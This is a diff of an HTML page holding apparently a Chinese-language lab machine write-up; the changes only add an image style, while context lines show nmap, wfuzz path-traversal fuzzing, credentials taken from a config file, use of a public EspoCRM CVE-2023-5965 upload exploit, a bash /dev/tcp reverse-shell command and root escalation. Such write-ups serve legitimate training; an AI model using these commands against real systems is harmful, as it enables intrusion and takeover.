@@ -211,7 +211,7 @@ MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.40 seconds                                                            </pre></div>
 <hr>
 <h1>2.踩点</h1>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3"><img src="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3"><img src="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>是个登录栏，搜索一下有没有什么漏洞</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ whatweb http://192.168.205.236                                     
@@ -259,8 +259,8 @@ Finished
 ===============================================================
                                  </pre></div>
 <p>发现一点有意思的东西</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51"><img src="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51" alt="image" style="max-width: 100%;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51"><img src="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51"><img src="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51"><img src="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>貌似可以通过绕过读取文件夹外的文件，我们爆破试试</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ wfuzz -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.236/admin../FUZZ<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
@@ -627,7 +627,7 @@ drwxrwxr-x  4 kali kali 4096 2023年12月 4日 upload
                                                     </pre></div>
 <p>在data文件夹中发现了配置文件，并且配置文件中有账号和密码，我们尝试登录</p>
 <p>成功进入<code class="notranslate">EspoCRM</code>,查看一下他版本信息</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22"><img src="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22"><img src="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>搜索该版本有没有漏洞。通过搜索发现存在<a href="https://github.com/josemlwdf/CVE-2023-5965">上传文件漏洞</a>，我们利用一下</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ git clone https://github.com/josemlwdf/CVE-2023-5965.git  
@@ -640,8 +640,8 @@ remote: Total 37 (delta 14), reused 0 (delta 0), pack-reused 0 (from 0)
 处理 delta 中: 100% (14/14), 完成.
                                              </pre></div>
 <p>发现第一个通过更新无效，尝试第二个上传插件，成功上传并有反馈</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201"><img src="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201" alt="image" style="max-width: 100%;"></a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1"><img src="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201"><img src="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1"><img src="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>弹一个反弹shell回来</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 执行语句</span>
 bash -c <span class="pl-s"><span class="pl-pds">"</span>bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1<span class="pl-pds">"</span></span>
@@ -1036,9 +1036,9 @@ uid=0(root) gid=0(root) groups=0(root)</pre></div>
 <p>成功提权</p>
 <h1>5.后话</h1>
 <p>看了一下<code class="notranslate">HGBE</code>大佬的wp，才发现群主<code class="notranslate">ll104567</code>发现了一个定时任务直接获取 root</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d"><img src="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d"><img src="https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d" alt="image" style="max-width: 100%; height: auto;"></a></p>
 <p>甚至在<code class="notranslate">www-data</code>权限的时候就可以直接提权到<code class="notranslate">root</code><br>
-<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95"><img src="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95" alt="C4" style="max-width: 100%;"></a></p></div>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95"><img src="https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95" alt="C4" style="max-width: 100%; height: auto;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
